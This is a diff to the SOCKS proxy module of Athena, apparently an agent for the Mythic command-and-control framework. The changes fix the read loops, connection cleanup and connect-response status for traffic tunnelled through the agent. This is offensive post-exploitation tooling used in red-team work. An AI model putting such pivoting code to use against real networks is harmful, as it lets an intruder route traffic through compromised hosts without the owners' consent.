@@ -1,12 +1,10 @@
 ﻿using Athena.Models.Athena.Socks;
 using Athena.Models.Mythic.Response;
 using Athena.Utilities;
-using Newtonsoft.Json;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Linq;
-using System.Net.Sockets;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -31,8 +29,8 @@ namespace Athena.Commands.Model
             try
             {
                 //Read
-                Task.Run(() => { ReadMythicMessages(); });
-                Task.Run(() => { ReadServerMessages(); });
+                Task.Run(() => { while (!this.ct.IsCancellationRequested) { ReadMythicMessages(); } });
+                Task.Run(() => { while (!this.ct.IsCancellationRequested) { ReadServerMessages(); } });
             }
             catch
             {
@@ -79,7 +77,6 @@ namespace Athena.Commands.Model
             {
                 SocksMessage sm;
                 while (!messagesIn.TryDequeue(out sm)) { }
-                //Misc.WriteDebug(messagesIn.Count().ToString());
                 Task.Run(() => { HandleMessage(sm); });
             }
         }
@@ -98,23 +95,9 @@ namespace Athena.Commands.Model
                 {
                     try
                     {
-                        List<byte[]> outMessages = connection.Value.receiveMessages();
-                        
-                        foreach(var msg in outMessages)
-                        {
-                            SocksMessage smOut = new SocksMessage()
-                            {
-                                server_id = connection.Value.server_id,
-                                data = Misc.Base64Encode(msg),
-                                exit = false
-                            };
-                            this.messagesOut.Enqueue(smOut);
-
-                        }
-
                         if (!connection.Value.socket.Connected)
                         {
-                            //Misc.WriteDebug($"{connection.Key} closed socket.");
+                            Misc.WriteDebug("Socket is no longer connected. (" + connection.Value.server_id + ")");
                             SocksMessage smOut = new SocksMessage()
                             {
                                 server_id = connection.Key,
@@ -124,6 +107,26 @@ namespace Athena.Commands.Model
 
                             //Add to our messages queue.
                             this.messagesOut.Enqueue(smOut);
+                            while (!this.connections.TryRemove(connection)) { };
+                        }
+                        else
+                        {
+                            if(connection.Value.socket.Available > 0)
+                            {
+                                List<byte[]> outMessages = connection.Value.receiveMessages();
+
+                                foreach (var msg in outMessages)
+                                {
+                                    SocksMessage smOut = new SocksMessage()
+                                    {
+                                        server_id = connection.Value.server_id,
+                                        data = Misc.Base64Encode(msg),
+                                        exit = false
+                                    };
+                                    this.messagesOut.Enqueue(smOut);
+
+                                }
+                            }
                         }
                     }
                     catch (ObjectDisposedException)
@@ -143,6 +146,15 @@ namespace Athena.Commands.Model
 
             if (this.connections.ContainsKey(sm.server_id))
             {
+                var conn = this.connections[sm.server_id];
+                if (sm.exit)
+                {
+                    Misc.WriteDebug("Got exit for ID: " + sm.server_id);
+                    this.connections[sm.server_id].socket.Dispose();
+                    while (!this.connections.TryRemove(sm.server_id, out conn)) { };
+                    return;
+                }
+
                 //We already know about this connection, so let's just forward the data.
                 if (!this.connections[sm.server_id].ForwardPacket(sm))
                 {
@@ -156,25 +168,31 @@ namespace Athena.Commands.Model
                 {
                     server_id = sm.server_id
                 };
+                ConnectResponse cr = new ConnectResponse();
+                //{
+                //    status = ConnectResponseStatus.Success,
+                //    bndaddr = cn.bndBytes ?? new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                //    bndport = cn.bndPortBytes ?? new byte[] { 0x00, 0x00 },
+                //    addrtype = cn.addressType
+                //};
+
 
                 if (cn.connected)
                 {
                     this.connections.AddOrUpdate(sm.server_id, cn, (key, oldValue) => cn);
+                    cr.status = ConnectResponseStatus.Success;
                     smOut.exit = false;
                 }
                 else
                 {
+                    cr.status = ConnectResponseStatus.GeneralFailure;
                     smOut.exit = true;
                 }
 
-                ConnectResponse cr = new ConnectResponse()
-                {
-                    status = ConnectResponseStatus.Success,
-                    bndaddr = cn.bndBytes,
-                    bndport = cn.bndPortBytes,
-                    addrtype = cn.addressType
-                };
-                
+                cr.bndaddr = cn.bndBytes ?? new byte[] { 0x01, 0x00, 0x00, 0x7F };
+                cr.bndport = cn.bndPortBytes ?? new byte[] { 0x00, 0x00 };
+                cr.addrtype = cn.addressType;
+
                 //Put our ConnectResponse into the SocksMessage
                 smOut.data = Misc.Base64Encode(cr.ToByte());
 
